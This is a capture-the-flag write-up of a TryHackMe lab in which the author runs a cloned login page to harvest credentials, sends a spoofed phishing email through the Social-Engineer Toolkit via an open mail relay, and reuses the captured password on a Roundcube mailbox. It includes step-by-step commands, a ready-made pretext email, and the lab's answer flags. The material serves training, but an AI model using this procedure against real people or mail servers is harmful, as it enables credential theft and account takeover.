# TryHackMe – Advent of Cyber 2025 Day 2
## Phishing – "Merry Clickmas" (Full, Fresh, Step-by-Step Write-Up)

**Goal:** Run a phishing page, send a convincing email with SET, harvest creds, then check if those creds are reused on the email portal to find the toys count.

**Lab IPs (example from my run):**
- Attacker (AttackBox): 10.49.90.194
- Target (Roundcube Mail): 10.49.148.207

*Replace with your own if different in the connection card.*

---

## 0) TL;DR: Answers (from my run)

- **Portal password (harvested):** unranked-wisdom-anthem
- **Total toys expected:** 1984000

*(You'll reproduce these via the steps below.)*

---

## 1) Prep: Start the phishing web server

The room provides a ready-made phishing portal + capture logic.

```bash
# Move to the room assets
cd ~/Rooms/AoC2025/Day02

# Sanity check files
ls -la
# Expect: index.html  server.py

# Launch the credential-capture server
./server.py
```

**Expected output:**
```
Starting server on http://0.0.0.0:8000
```

### Verify it's reachable

From the AttackBox, open Firefox and browse to either:
- `http://127.0.0.1:8000`
- `http://10.49.90.194:8000` (your AttackBox IP)

You should see a TBFC login page clone. Keep this terminal visible to catch posted credentials.

---

## 2) Deliver: Send the phishing email using SET

Open a new terminal (don't close server.py).

```bash
setoolkit
```

Then feed these exact options/inputs when prompted:

```
set> 1
# 1) Social-Engineering Attacks

set> 5
# 5) Mass Mailer Attack

set:mailer> 1
# 1) E-Mail Attack Single Email Address
```

Now answer the prompts exactly (adjust only IPs if yours differ):

```
set:phishing> Send email to: factory@wareville.thm

1. Use a Gmail account for your email attack.
2. Use your own server or open relay

set:phishing> 2
set:phishing> From address (ex: moo@example.com): updates@flyingdeer.thm
set:phishing> The FROM NAME the user will see: Flying Deer
set:phishing> Username for open-relay [blank]:
set:phishing> Password for open-relay [blank]:
set:phishing> SMTP email server address (ex. smtp.youremailserveryouown.com): 10.49.148.207
set:phishing> Port number for the SMTP server [25]:
set:phishing> Flag this message/s as high priority? [yes|no]: no
Do you want to attach a file - [y/n]: n
Do you want to attach an inline file - [y/n]: n
set:phishing> Email subject: Shipping Schedule Changes
set:phishing> Send the message as HTML or plain? 'h' or 'p' [p]:
```

**IMPORTANT:** When finished, type `END` (all capital) then hit `{return}` on a new line.

```
set:phishing> Enter the body of the message, type END (capitals) when finished:
```

Paste the message body (ensure the URL uses your AttackBox IP and port 8000):

```
Dear elves,
Kindly note that there have been significant changes to the shipping schedules due to increased shipping orders.
Please confirm the new schedule by visiting http://10.49.90.194:8000
Best regards,
Flying Deer
END
```

SET should confirm:
```
[*] SET has finished sending the emails
Press <return> to continue
```

You can exit SET or leave it open; the important part is the sent email.

---

## 3) Catch: Harvest credentials from the phishing page

Switch back to the terminal running `./server.py`. When the target "factory" follows the link and submits, you'll see captured creds:

**Example from my run:**
```
[2025-12-02 17:30:02] Captured -> username: admin    password: unranked-wisdom-anthem    from: 10.49.148.207
```

**Flag 1:** The TBFC portal password is the captured password.
From my run: **unranked-wisdom-anthem**

---

## 4) Pivot: Test password reuse on Roundcube (email portal)

Open Firefox on the AttackBox and browse:
```
http://10.49.148.207
```

Try the harvested password with likely usernames:
- `factory` / `<harvested_password>`
- If that fails, try `admin` / `<harvested_password>`

In my run, the email portal accepted `factory` with the harvested password and the inbox showed the operational email.

### Open the message:

- **Subject example:** "Urgent: Production & Shipping Request — 1984000 Units (Next 2 Weeks)"
- **From:** marta
- **Date:** varies (e.g., 2025-10-10)

Scroll/read to find the explicit toys count line. From my run:
> Repeat confirmation: the total requested to be manufactured and shipped is 1984000 units.

**Flag 2:** **1984000**

---

## 5) Useful one-liners & sanity checks

If something doesn't work, use these:

```bash
# Confirm server is listening on 8000
ss -lntp | grep 8000

# Quick HTTP header check to your phishing page
curl -I http://127.0.0.1:8000

# Verify SMTP port reachability on the target mail server
nc -vz 10.49.148.207 25

# If Firefox can't resolve a name, stick to raw IPs as above.
```

---

## 6) Notes on realism & OPSEC (why this works here)

**Pretext quality matters:** We spoofed a shipper ("Flying Deer") with a legit-sounding subject and workflow-appropriate request.

**Link discipline:** Training recommends "Type the address yourself." The test simulates a user who clicked.

**Password reuse:** The room purposefully reuses the harvested password on the mail portal—very common in real orgs.

**Capture logic:** The provided server.py hosts a cloned page and prints posted creds—exactly what a credential harvester would do.

---

## 7) Screens/Outputs you should capture for your notes

- ./server.py start message and the captured creds line.
- SET flow (menus + your inputs), especially the SMTP target and email body.
- Roundcube inbox showing the email with the toys count.

---

## 8) Final Answers (confirm)

**Q1: What is the password used to access the TBFC portal?**
→ `unranked-wisdom-anthem` (from captured output)

**Q2: What is the total number of toys expected for delivery?**
→ `1984000` (from the Roundcube email)

---

## 9) Cleanup (optional)

```bash
# Stop the phishing server (Ctrl+C in the server.py terminal)
# No persistent services are left running by default.
```

---

## 10) Takeaways

- Phishing success hinges on credible pretext + clean delivery.
- Always test for credential reuse across internal portals.
- Even with training, urgency + authority can push users into risky clicks.
- Defensive counter: teach S.T.O.P. (Slow down, Type address, Open nothing unexpected, Prove sender).
